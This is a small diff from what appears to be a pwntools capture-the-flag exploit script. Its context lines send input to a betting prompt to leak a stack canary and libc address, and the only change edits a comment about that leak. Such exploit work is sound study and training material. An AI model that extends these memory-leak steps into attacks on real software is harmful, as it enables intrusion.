@@ -76,7 +76,7 @@ def exploit():
         if x == b"":
             io.interactive()
 
-    ## Leaking canary/libc adress and overflowing
+    ## Leaking canary/libc adress
     io.sendlineafter(b"Enter bet value: ", b"v")
     io.recvuntil("Bet #117: Value ")
     canary = int(io.recvline())
